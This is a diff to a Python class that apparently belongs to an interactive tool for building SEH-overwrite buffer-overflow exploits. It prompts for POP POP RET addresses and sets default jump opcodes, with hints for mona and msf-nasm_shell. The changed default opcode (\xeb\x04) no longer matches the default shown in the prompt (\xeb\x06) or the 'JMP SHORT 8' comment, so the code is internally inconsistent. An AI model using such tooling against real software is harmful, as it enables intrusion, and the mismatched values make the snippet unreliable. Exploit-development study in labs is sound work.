@@ -112,7 +112,7 @@ class Seh:
 
                     print("[+] Buffer Injected (" + str(len(buffer)) + " bytes) to test STACK FILLING!!!")
                     print("[!] Hint: !mona seh -n")
-                    self.config.ppr_address = System.input("[?] Check the target debugger and enter POP POP RET address to replace SEH:")
+                    self.config.ppr_address = System.input("[?] Check the target debugger and enter POP POP RET address to overwrite SEH:")
                 else:
                     self.config.ppr_address = _ppr_address
 
@@ -130,9 +130,9 @@ class Seh:
 
             if (self.config.skip_seh == "") : # or self.config.nops == 0) :
 
-                _skip_seh = System.input("[?] Enter the OPCODE to bypass SEH + NextSEH (Hint: msf-nasm_shell> jmp short 8) [\\x90\\x90\\xeb\\x06] : ")
+                _skip_seh = System.input("[?] Enter the OPCODE to bypass SEH + NextSEH (Hint: msf-nasm_shell> jmp short {x} bytes) [\\x90\\x90\\xeb\\x06] : ")
                 if (_skip_seh == "") :
-                    self.config.skip_seh = r"\x90\x90\xeb\x06"  # JMP SHORT 8
+                    self.config.skip_seh = r"\x90\x90\xeb\x04"  # JMP SHORT 8
                 else:
                     self.config.skip_seh = self.str_encode(_skip_seh)
 
